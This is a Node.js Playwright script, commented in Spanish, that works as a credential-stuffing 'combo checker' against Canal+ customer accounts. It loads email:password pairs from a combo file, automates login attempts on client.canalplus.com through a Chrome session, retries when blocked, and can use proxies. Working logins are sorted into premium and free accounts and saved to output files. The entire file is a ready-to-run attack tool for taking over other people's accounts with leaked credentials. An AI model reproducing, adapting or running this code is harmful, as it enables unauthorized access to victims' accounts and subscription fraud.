const fs = require('fs');
const readline = require('readline');
const { chromium } = require('playwright');
const chalk = require('chalk');
const cliProgress = require('cli-progress');
const ora = require('ora').default;

// Archivos
const comboPath = 'C:\\Users\\opc\\Documents\\cplus\\combo.txt';
const validPath = 'C:\\Users\\opc\\Documents\\cplus\\validacceso.txt';
const freePath = 'C:\\Users\\opc\\Documents\\cplus\\free.txt';

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const ask = (question) => new Promise(resolve => rl.question(question, resolve));

// Función que procesa un solo combo con lógica de reintento
async function procesarCombo(combo, index, total, validCount, invalidCount) {
  let reintentar = true;

  while (reintentar) {
    const spinner = ora(`[${index + 1}/${total}] Comprobando ${combo}`).start();
    let browser = null;

    try {
      browser = await chromium.connectOverCDP('http://localhost:9222');
      const context = await browser.newContext();
      const page = await context.newPage();

      await page.goto('https://client.canalplus.com/?sc_intcmp=MYCWEB:USERMENU:EC');
      await page.waitForLoadState('load');

      await page.click('xpath=//*[@id="didomi-notice-agree-button"]/span').catch(() => {});
      await page.waitForTimeout(200);
      await page.click('xpath=//*[@id="app"]/div/div/main/div/div[2]/div[1]/div[1]/button');
      await page.waitForTimeout(200);

      const modal = await page.$('xpath=/html/body/div[2]/div/div[2]/div').catch(() => null);
      if (modal) {
        spinner.warn(chalk.magenta(`[${index + 1}/${total}] ?? Modal inesperado detectado, reintentando combo...`));
        await browser.close();
        continue;
      }

      const [email, password] = combo.split(/:(.*)/).map(p => p.trim());
      await page.fill('xpath=//*[@id="input28"]', email);
      await page.fill('xpath=//*[@id="input36"]', password);
      await page.click('xpath=//*[@id="form20"]/div[2]/input');

      // Esperar el resultado del login (éxito o error)
      const loginResult = await Promise.race([
        page.waitForSelector('xpath=//*[@id="error-message"]', { timeout: 12000 }).then(() => 'error').catch(() => null),
        page.waitForSelector('xpath=//*[@id="app"]/div/div/main/div/div[2]/nav/ul/li[2]/a/div[1]/div', { timeout: 12000 }).then(() => 'success').catch(() => null)
      ]);

      if (loginResult === 'error') {
        spinner.fail(chalk.red(`[${index + 1}/${total}] ${combo} ? INVÁLIDO | ? Válidos: ${validCount} | ? Inválidos: ${invalidCount + 1}`));
        await browser.close();
        return 'invalid';
      }

      if (loginResult === 'success') {
        const success = await page.$('xpath=//*[@id="app"]/div/div/main/div/div[2]/nav/ul/li[2]/a/div[1]/div');
        await success.click();
        await page.waitForTimeout(12000);

        const freeIndicator = await page.$('xpath=//*[@id="app"]/div/div/main/div/div/div/div[3]/h2');

        if (!freeIndicator) {
          spinner.warn(chalk.hex('#FFA500')(`[${index + 1}/${total}] ${combo} ?? VÁLIDO pero cuenta FREE | ? Válidos: ${validCount + 1} | ? Inválidos: ${invalidCount}`));
          fs.appendFileSync(freePath, combo + '\n', 'utf8');
        } else {
          spinner.succeed(chalk.green(`[${index + 1}/${total}] ${combo} ? PREMIUM | ? Válidos: ${validCount + 1} | ? Inválidos: ${invalidCount}`));
          fs.appendFileSync(validPath, combo + '\n', 'utf8');
          await browser.close();
          return 'valid';
        }

        await browser.close();
        return 'free';
      }

      // Resultado incierto
      spinner.warn(chalk.yellow(`[${index + 1}/${total}] ${combo} ? Resultado incierto | ? Válidos: ${validCount} | ? Inválidos: ${invalidCount}`));
      await browser.close();
      return 'inconcluso';

    } catch (err) {
      if (browser) {
        await browser.close();
      }
      ora().warn(chalk.magenta(`[${index + 1}/${total}] ?? Error al procesar combo (${combo}): ${err.message}. Reintentando...`));
      continue;
    }
  }
}

(async () => {
  console.log(chalk.cyan('?? Asegúrate de que ya abriste Chrome con el puerto CDP habilitado (9222).'));

  const usarProxies = (await ask('¿Deseas usar proxy? (s/n): ')).toLowerCase();

  let proxyToShow = null;
  if (usarProxies === 's') {
    const proxyFilePath = await ask('Ingresa la ruta del archivo de proxies (ip:puerto): ');
    if (!fs.existsSync(proxyFilePath)) {
      console.log(chalk.red('? Archivo de proxies no encontrado.'));
      process.exit();
    }

    const proxies = fs.readFileSync(proxyFilePath, 'utf8').split('\n').map(p => p.trim()).filter(Boolean);

    if (proxies.length === 0) {
      console.log(chalk.red('? El archivo de proxies está vacío.'));
      process.exit();
    }

    proxyToShow = proxies[0];
    console.log(chalk.magenta(`?? Recuerda configurar este proxy manualmente en Chrome: ${proxyToShow}`));
  } else {
    console.log(chalk.yellow('?? Se ejecutará sin proxy.'));
  }

  const combosRaw = fs.readFileSync(comboPath, 'utf8').split('\n').map(l => l.trim()).filter(Boolean);

  const combos = combosRaw.filter(line => {
    const [email, password] = line.split(/:(.*)/).map(p => p.trim());
    return email && password;
  });

  const bar = new cliProgress.SingleBar({
    format: '{bar} | {percentage}% | {value}/{total} combos | ? Válidos: {valid} | ? Inválidos: {invalid}',
    barCompleteChar: '\u2588',
    barIncompleteChar: '\u2591',
    hideCursor: true
  }, cliProgress.Presets.shades_classic);

  bar.start(combos.length, 0, { valid: 0, invalid: 0 });

  let validCount = 0;
  let invalidCount = 0;

  for (let i = 0; i < combos.length; i++) {
    const combo = combos[i];
    const result = await procesarCombo(combo, i, combos.length, validCount, invalidCount);

    if (result === 'valid') validCount++;
    if (result === 'invalid') invalidCount++;

    bar.increment({ valid: validCount, invalid: invalidCount });
    await new Promise(resolve => setTimeout(resolve, 500));
  }

  bar.stop();
  rl.close();
  console.log(chalk.cyan('\n? Proceso terminado.'));
})();
